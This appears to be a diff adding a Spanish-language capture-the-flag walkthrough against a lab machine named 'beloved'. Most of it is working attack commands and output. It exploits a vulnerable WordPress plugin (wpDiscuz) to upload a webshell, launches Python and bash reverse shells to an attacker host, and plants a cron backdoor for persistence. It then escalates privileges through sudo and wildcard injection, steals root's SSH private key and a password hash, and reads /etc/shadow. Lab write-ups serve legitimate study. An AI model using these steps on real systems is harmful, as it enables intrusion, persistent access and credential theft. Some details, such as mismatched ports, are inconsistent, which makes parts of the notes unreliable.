@@ -1,0 +1,261 @@
+-------------------
+Ataque a Wordpress desactualizado
+-------------------
+
+wpscan --url http:[REDACTED_IP] --plugins-detection aggressive -t 50
+
+-------------------
+se detecta pluging obsoleto y se aprovecha
+-------------------
+
+searchsploit wpDiscuz
+
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)          | php/webapps/49962.sh
+WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)          | php/webapps/49967.py  ---se aprovecha este
+Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploi | php/webapps/49401.rb
+
+-------------------
+se descarga este exploit
+-------------------
+
+searchsploit -m 49967
+
+-------------------
+se sube el archivo
+-------------------
+
+searchsploit -m 49967
+python3 49967.py -u http://[REDACTED_IP] -p /2021/06/09/hello-world
+
+-------------------
+genera la webshell y la sube
+--------------------
+
+[+] Generating random name for Webshell...
+[!] Generated webshell name: zfnvocokqkhdags
+
+[!] Trying to Upload Webshell..
+[+] Upload Success... Webshell path:url&quot;:&quot;http://beloved/wp-[REDACTED]-1758577520.6333.php&quot; 
+
+-------------------
+en el navegador web se verifica que funcione la shell
+------------------
+http://[REDACTED_IP]/wp-[REDACTED]-1758578263.6125.php?cmd=pwd
+http://[REDACTED_IP]/wp-[REDACTED]-1758578263.6125.php?cmd=which%20python3
+
+-------------------------
+encender donde escuchar y dejar escuchando
+-----------------------
+nc -lvvp 4444
+
+
+---------------------------
+ejecutar y activar el reverse en el navegador
+---------------------------
+
+http://beloved/wp-[REDACTED]-1758578263.6125.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[REDACTED_IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+
+
+---------------------------
+penetration
+---------------------------
+
+# Verificar permisos de sudo
+sudo -l
+
+
+EXPLOTACIÓN DE NOKOGIRI PARA ESCALAR PRIVILEGIOS
+¿Qué es Nokogiri?
+
+Nokogiri es una herramienta para parsear XML/HTML en Ruby. Podemos explotarla para obtener shell como usuario beloved.
+
+
+---------------------------
+ver que se puede hacer
+---------------------------
+
+sudo -u beloved /usr/local/bin/nokogiri --help
+
+---------------------------
+//escalar de usuario///
+---------------------------
+--conectar como usuario beloved en nokogiri--
+sudo -u beloved /usr/local/bin/nokogiri /etc/hosts
+
+--como estoy conectado--
+`whoami`
+
+--ejecutar backdoor--
+`/bin/bash -c "echo '#!/bin/bash' > /home/beloved/.backdoor.sh && echo 'bash -i >& /dev/tcp/[REDACTED_IP]/4444 0>&1' >> /home/beloved/.backdoor.sh && chmod +x /home/beloved/.backdoor.sh && (crontab -l ; echo '*/2 * * * * /home/beloved/.backdoor.sh') | crontab -"`
+www-data ALL=(beloved) NOPASSWD: /usr/local/bin/nokogiri
+
+--verificar que se creo--
+`ls -la /home/beloved/.backdoor.sh`
+`crontab -l`
+
+---ingresar de nuevo por backdoor--
+nc -lvvp 4444
+
+--navegador--
+http://beloved/wp-[REDACTED]-1758578263.6125.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[REDACTED_IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+
+---------------------------
+si puede leer documentos sensibles
+---------------------------
+
+sudo -u beloved /usr/local/bin/nokogiri /etc/passwd
+help
+
+---------------------------
+bash mode
+---------------------------
+
+sudo -u beloved /usr/local/bin/nokogiri /etc/hosts
+system "/bin/bash"
+
+cat /home/beloved/user.txt
+[REDACTED]
+
+
+
+---------------------------
+descargar 
+# En tu máquina KALI, descarga pspy64
+---------------------------
+
+wget https://github.[REDACTED].2.1/pspy64
+chmod +x pspy64
+
+---------------------------
+activar en kali
+---------------------------
+
+python3 -m http.server 8081
+
+---------------------------
+instalar en maquina victima
+---------------------------
+
+cd /tmp
+wget http://[REDACTED_IP]:8080/pspy64
+chmod +x pspy64
+
+---------------------------
+dar permiso de ejecucion en maquina victima
+---------------------------
+
+chmod +x /tmp/pspy64
+
+---------------------------
+ejecutar en maquina victima
+---------------------------
+
+./pspy64
+
+---------------------------
+escalar privilegios
+---------------------------
+
+
+
+En una NUEVA terminal de Kali
+nc -lvnp 4445
+Pega esta URL exacta:
+http://[REDACTED_IP]/wp-[REDACTED]-1758578263.6125.php?cmd=bash -c "bash -i >%26 /dev/tcp/[REDACTED_IP]/4445 0>%261"
+
+
+---------------------------
+EXPLOTACIÓN CORRECTA DEL WILDCARD INJECTION
+---------------------------
+--Creaste un archivo normal llamado "reference"--
+
+touch reference 
+
+---- será interpretado como NOMBRE de archivo, no como parámetro / indica "fin de opciones"
+
+touch -- --reference=reference
+
+---Creaste un symlink a /etc/passwd
+
+ln -s /etc/passwd
+ls -al /etc/passwd
+
+---------------------------------------
+----------------------------------------
+beloved@beloved:/opt$ ls -la
+ls -la
+total 12
+drwxrwx---  2 root    beloved 4096 Sep 23 03:10 .
+drwxr-xr-x 18 root    root    4096 May 19  2021 ..
+-rw-------  1 root    root    1823 Jun 27  2021 id_rsa
+lrwxrwxrwx  1 beloved beloved   11 Sep 23 03:10 passwd -> /etc/passwd
+-rw-r--r--  1 root    root       0 Sep 23 03:09 reference
+-rw-r--r--  1 beloved beloved    0 Sep 23 03:10 --reference=reference
+-------------------------------------
+--------------------------------------
+
+
+clave beloved 
+$1$KH.7zM0B$MajKL1skvndcrZC0Yr3VT0
+
+cat id_rsa
+
+-----------------------
+mirar la clave root
+-----------------------
+[REDACTED_PRIVATE_KEY]
+
+
+
+--------------------
+conectarse como root
+-------------------
+
+cd ~
+nano id_rsa
+
+crear archivo con la clave
+
+
+[REDACTED_PRIVATE_KEY]
+
+-----------------
+conectarse como root
+------------------
+
+ssh -i id_rsa root@localhost
+
+
+----------
+final Flag capturada
+---------
+
+whoami
+root               
+
+---------------
+capturar flag
+----------------
+
+cat root.txt |base64
+                                                                                            
+[REDACTED] 
+
+cat root.txt      
+[REDACTED]                                                                                             
+      
+cat user.txt
+[REDACTED]
+
+
+---------------
+cosas con root
+-----------------
+cat /etc/passwd
+cat /etc/shadow   # (si eres root)
+cat id_rsa
